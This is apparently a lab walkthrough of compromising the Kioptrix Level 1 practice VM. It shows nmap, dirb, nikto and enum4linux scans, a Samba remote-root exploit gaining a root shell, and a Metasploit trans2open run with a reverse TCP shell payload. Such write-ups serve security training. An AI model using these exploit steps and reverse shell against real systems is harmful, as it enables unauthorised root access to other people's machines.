Reconnaissance:

Started by finding the host on the network.

nmap -sS -O 192.168.118.0/24

Found 192.168.118.174


Enumeration:

Now that I've found the host it is time to check what is open.

root@kali:~# nmap -A -T4 192.168.118.174

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-18 15:54 EDT
Nmap scan report for 192.168.118.174
Host is up (0.00040s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2017-05-18T19:56:41+00:00; +1m52s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:7C:12:C2 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: mean: 1m51s, deviation: 0s, median: 1m51s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 192.168.118.174

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.28 seconds

Lets poke at the web server and see if there is anything interesting.

root@kali:~# dirb http://192.168.118.174

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu May 18 16:03:42 2017
URL_BASE: http://192.168.118.174/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.118.174/ ----
+ http://192.168.118.174/~operator (CODE:403|SIZE:273)                                                          
+ http://192.168.118.174/~root (CODE:403|SIZE:269)                                                              
+ http://192.168.118.174/cgi-bin/ (CODE:403|SIZE:272)                                                           
+ http://192.168.118.174/index.html (CODE:200|SIZE:2890)                                                        
==> DIRECTORY: http://192.168.118.174/manual/                                                                   
==> DIRECTORY: http://192.168.118.174/mrtg/                                                                     
==> DIRECTORY: http://192.168.118.174/usage/                                                                    

---- Entering directory: http://192.168.118.174/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.118.174/mrtg/ ----
+ http://192.168.118.174/mrtg/index.html (CODE:200|SIZE:17318)                                                  

---- Entering directory: http://192.168.118.174/usage/ ----
+ http://192.168.118.174/usage/index.html (CODE:200|SIZE:3704)                                                  

-----------------
END_TIME: Thu May 18 16:03:56 2017
DOWNLOADED: 13836 - FOUND: 6



root@kali:~# nmap --script http-methods -p 443 192.168.118.174

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-18 17:21 EDT
Nmap scan report for 192.168.118.174
Host is up (0.00040s latency).
PORT    STATE SERVICE
443/tcp open  https
| http-methods:
|_  Supported Methods: GET HEAD POST
MAC Address: 00:0C:29:7C:12:C2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds

root@kali:~# nikto -h 192.168.118.174
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.118.174
+ Target Hostname:    192.168.118.174
+ Target Port:        80
+ Start Time:         2017-05-18 18:17:38 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ 8345 requests: 0 error(s) and 21 item(s) reported on remote host
+ End Time:           2017-05-18 18:17:59 (GMT-4) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

CVE-2002-0082 sounds interesting!  Some quick Googling finds https://www.exploit-db.com/exploits/764/

After some tutorials the exploit still had problems building.  I know there is other ways in, hunting
for those is more fun than beating on 14 year old c code and trying to fix a library.

SMB is open and a dead giveaway for problems on this server.  Lets poke it more and see what we can find.

root@kali:~# enum4linux 192.168.118.174

***snip***

=========================================
|    OS information on 192.168.118.174    |
=========================================
[+] Got OS info for 192.168.118.174 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
[+] Got OS info for 192.168.118.174 from srvinfo:
 KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
 platform_id     :	500
 os version      :	4.5
 server type     :	0x9a03


 ***snip***

 Quick Googling finds https://www.exploit-db.com/download/10.  Look!  That compiles, see...wasn't that more fun than fighting with OpenFuck.

 root@kali:~# ./sambal -b 0 -v 192.168.118.174
 samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
 --------------------------------------------------------------
 + Verbose mode.
 + Bruteforce mode. (Linux)
 + Host is running samba.
 + Using ret: [0xbffffed4]
 + Using ret: [0xbffffda8]
 + Worked!
 --------------------------------------------------------------
 *** JE MOET JE MUIL HOUWE
 Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
 uid=0(root) gid=0(root) groups=99(nobody)
 whoami
 root

 cd /var/spool/mail
 cat root
 From root  Sat Sep 26 11:42:10 2009
 Return-Path: <root@kioptix.level1>
 Received: (from root@localhost)
 	by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
 	for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
 Date: Sat, 26 Sep 2009 11:42:10 -0400
 From: root <root@kioptix.level1>
 Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
 To: root@kioptix.level1
 Subject: About Level 2
 Status: O

 If you are reading this, you got root. Congratulations.
 Level 2 won't be as easy...

 From root  Thu May 18 15:36:54 2017
 Return-Path: <root@kioptrix.level1>
 Received: (from root@localhost)
 	by kioptrix.level1 (8.11.6/8.11.6) id v4IJasM01051
 	for root; Thu, 18 May 2017 15:36:54 -0400
 Date: Thu, 18 May 2017 15:36:54 -0400
 From: root <root@kioptrix.level1>
 Message-Id: <201705181936.v4IJasM01051@kioptrix.level1>
 To: root@kioptrix.level1
 Subject: LogWatch for kioptrix.level1



  ################## LogWatch 2.1.1 Begin #####################


  ###################### LogWatch End #########################


Easy mode for bonus points

msf > use exploit/linux/samba/trans2open
msf exploit(trans2open) > set rhost 192.168.118.174
msf exploit(trans2open) > set payload generic/shell_reverse_tcp
msf exploit(trans2open) > set lhost 192.168.118.173
msf exploit(trans2open) > run

[*] Started reverse TCP handler on 192.168.118.173:4444
[*] 192.168.118.174:139 - Trying return address 0xbffffdfc...
[*] 192.168.118.174:139 - Trying return address 0xbffffcfc...
[*] 192.168.118.174:139 - Trying return address 0xbffffbfc...
[*] 192.168.118.174:139 - Trying return address 0xbffffafc...
[*] Command shell session 2 opened (192.168.118.173:4444 -> 192.168.118.174:1027) at 2017-05-18 19:09:52 -0400

whoami
root
